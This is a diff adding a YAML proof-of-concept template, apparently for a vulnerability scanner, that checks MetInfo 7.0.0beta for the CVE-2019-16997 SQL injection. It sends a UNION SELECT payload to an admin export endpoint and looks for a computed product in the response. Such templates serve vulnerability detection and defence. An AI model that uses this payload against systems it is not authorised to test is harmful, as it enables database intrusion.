@@ -1,0 +1,24 @@
+detail:
+  author: JingLing(https://hackfun.org/)
+  links:
+  - https://y4er.com/post/metinfo7-sql-tips/#sql-injection-2
+  metinfo_version: 7.0.0beta
+expression: r0()
+manual: true
+name: poc-yaml-metinfo-cve-2019-16997-sqli
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r1
+      * r2)))
+    request:
+      body: appno= 1 union SELECT {{r1}}*{{r2}},1&editor=cn&site=web
+      cache: true
+      follow_redirects: true
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      method: POST
+      path: /admin/?n=language&c=language_general&a=doExportPack
+set:
+  r1: randomInt(40000, 44800)
+  r2: randomInt(40000, 44800)
+transport: http
